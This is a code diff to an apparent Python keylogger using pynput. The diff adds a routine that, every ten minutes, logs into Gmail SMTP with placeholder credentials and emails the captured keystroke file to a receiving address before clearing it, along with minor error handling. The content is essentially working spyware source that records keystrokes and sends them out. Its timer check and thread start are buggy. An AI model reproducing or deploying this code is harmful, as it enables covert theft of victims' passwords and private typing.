@@ -1,9 +1,20 @@
-import pynput, time, threading, os
+import pynput, time, threading, os, smtplib, ssl
 
+from datetime import datetime
 from pynput.keyboard import Key, Listener
 from threading import Thread
+from email.mime.multipart import MIMEMultipart # Creates a Email object.
+from email.mime.text import MIMEText # For text.
+from email.mime.application import MIMEApplication # For File Attachment
 
-CYCLE = 60*10 # Time interval to Email and Clean Logs. (10 Minutes)
+
+
+# Email information.
+EMAILID = "EMAIL"
+EMAILPASS = "PASS"
+TOEMAIL = "EMAIL TO RECEIVE FILES"
+
+CYCLE = 10 * 60 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
 ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' '} # Dict Containing Non-alpha keys.
@@ -19,8 +30,12 @@ def on_press(key):
         text = ReplaceCode[key]
     elif key == Key.backspace: # Remove last character in file if backspace was read.
         with open(FILENAME, 'rb+') as file:
-            file.seek(-1, os.SEEK_END) # Seeks the character before the last.
-            file.truncate() # Remove the last character.
+            try: #Only delete last character if the text file has text.
+                file.seek(-1, os.SEEK_END)
+                file.truncate()
+                pass
+            except Exception: # Otherwise exception is found.
+                print("No content to be deleted in the file.\n")
 
     # Write to file if text is valid.
     if text != None:
@@ -31,15 +46,41 @@ def on_release(key):
     if key == Key.esc:
         return False
 
-# File Manager.
-def IntervalFileCls():
+def IntervalEmailandCls():
 
     StartTime = time.time() # Start Timer at when thread starts.
     global finished
 
     while (finished == False):
         ElapsedTime = time.time() - StartTime
-        if (ElapsedTime == CYCLE): # If 10s has passed.
+        if (ElapsedTime == CYCLE): # If 10 minutes has passed.
+
+            try:
+                server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
+                server.starttls() # secure connection.
+                server.login(EMAILID, EMAILPASS) # Logins to account.
+
+                # EMAIL OBJECT
+                emailbod = MIMEMultipart()
+                emailbod['From'] = EMAILID
+                emailbod['To'] = TOEMAIL
+                emailbod['Subject'] = "Log from {0}".format(str(datetime.now()))
+
+                # TEXT FILE
+                logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
+                logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
+                emailbod.attach(logFile) # Attach the file to the email.
+
+                emailbod.attach(MIMEText('Contains the all key logs from {0}'.format(str(datetime.now()))))
+
+                server.sendmail(EMAILID,TOEMAIL, emailbod.as_string()) # Sends it as a string form.
+
+            except Exception as E:
+                print(E.__str__())
+
+            finally:
+                server.quit() # Close the connection.
+
             clean_file(FILENAME)
             StartTime = time.time() # Reset Start Time.
 
@@ -53,13 +94,13 @@ def write_file(file, input):
     with open(file, 'a') as file:
         file.write(input)
 
-# --------------- MAIN ---------------
+# Function to retrieve Key presses.
 def main():
 
     global finished
 
     # Create a new file to write to.
-    open(FILENAME, "w").close()
+    open(FILENAME, "w+").close()
 
     # Create Keyboard Listener.
     with Listener(on_press=on_press, on_release=on_release) as listener:
@@ -69,9 +110,8 @@ def main():
             finished = True
             print("\nFinished.\n")
 
-
 # Execute if it is the main module.
 if __name__ == "__main__":
-    # Multi Threads.
+    # Executing both Cleanup Interval and Main method.
     Thread(target=main).start()
-    Thread(target=IntervalFileCls).start()
+    Thread(target=IntervalEmailandCls()).start()
